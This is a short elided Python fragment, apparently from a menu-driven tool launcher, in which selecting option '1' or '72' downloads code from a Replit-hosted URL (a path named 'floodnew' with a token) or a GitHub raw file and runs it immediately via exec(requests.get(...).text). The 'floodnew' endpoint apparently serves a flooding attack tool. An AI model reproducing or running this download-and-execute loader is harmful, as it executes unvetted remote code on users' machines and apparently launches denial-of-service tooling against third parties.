...
if chon == '1' :
    exec(requests.get('https://8d9822fb-e804-462f-993c-ef0e3c94662e-00-216vv99ow97dh.sisko.replit.dev/run/floodnew?token=hanh191229').text)
if chon == '2':
...
if chon == '72' :
    exec(requests.get('https://raw.githubusercontent.com/OTP000/Tool-OTP/refs/heads/main/tool.py').text)
else :
     exit()
